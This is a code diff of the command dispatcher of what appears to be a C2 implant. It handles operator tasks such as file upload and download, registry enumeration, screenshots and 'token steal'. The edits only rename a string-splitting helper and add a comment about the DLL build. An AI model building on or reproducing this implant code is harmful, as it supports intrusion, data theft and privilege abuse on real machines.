@@ -131,7 +131,7 @@ namespace Handler
         else if (wcscmp(task.substr(0, 3).c_str(), L"cp ") == 0)
         {
             // Parse arguments.
-            std::vector<std::wstring> wArgs = Utils::Split::SplitW(task, L' ');
+            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
             if (wArgs.size() != 3)
             {
                 return L"Error: Invalid argument.";
@@ -141,7 +141,7 @@ namespace Handler
         else if (wcscmp(task.substr(0, 9).c_str(), L"download ") == 0)
         {
             // Parse arguments.
-            std::vector<std::wstring> wArgs = Utils::Split::SplitW(task, L' ');
+            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
             if (wArgs.size() != 3)
             {
                 return L"Error: Invalid argument.";
@@ -179,7 +179,7 @@ namespace Handler
         else if (wcscmp(task.substr(0, 3).c_str(), L"mv ") == 0)
         {
             // Parse arguments.
-            std::vector<std::wstring> wArgs = Utils::Split::SplitW(task, L' ');
+            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
             if (wArgs.size() != 3)
             {
                 return L"Error: Invalid argument.";
@@ -209,7 +209,7 @@ namespace Handler
         else if (wcscmp(task.substr(0, 12).c_str(), L"reg subkeys ") == 0)
         {
             // Parse arguments.
-            std::vector<std::wstring> wArgs = Utils::Split::SplitW(task, L' ');
+            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
             if (wArgs.size() < 5)
             {
                 return L"Error: Invalid argument.";
@@ -226,7 +226,7 @@ namespace Handler
         else if (wcscmp(task.substr(0, 11).c_str(), L"reg values ") == 0)
         {
             // Parse arguments.
-            std::vector<std::wstring> wArgs = Utils::Split::SplitW(task, L' ');
+            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
             if (wArgs.size() < 5)
             {
                 return L"Error: Invalid argument.";
@@ -250,6 +250,7 @@ namespace Handler
         }
         else if (wcscmp(task.c_str(), L"screenshot") == 0)
         {
+            // Is DLL implant, the screenshot feature is not available.
             #ifndef IS_DLL
             return Task::Screenshot(hInstance, nCmdShow);
             #else
@@ -267,7 +268,7 @@ namespace Handler
         else if (wcscmp(task.substr(0, 12).c_str(), L"token steal ") == 0)
         {
             // Parse arguments.
-            std::vector<std::wstring> wArgs = Utils::Split::SplitW(task, L' ');
+            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
             if (wArgs.size() != 4)
             {
                 return L"Error: Invalid argument.";
@@ -277,7 +278,7 @@ namespace Handler
         else if (wcscmp(task.substr(0, 7).c_str(), L"upload ") == 0)
         {
             // Parse arguments.
-            std::vector<std::wstring> wArgs = Utils::Split::SplitW(task, L' ');
+            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
             if (wArgs.size() != 3)
             {
                 return L"Error: Invalid argument.";
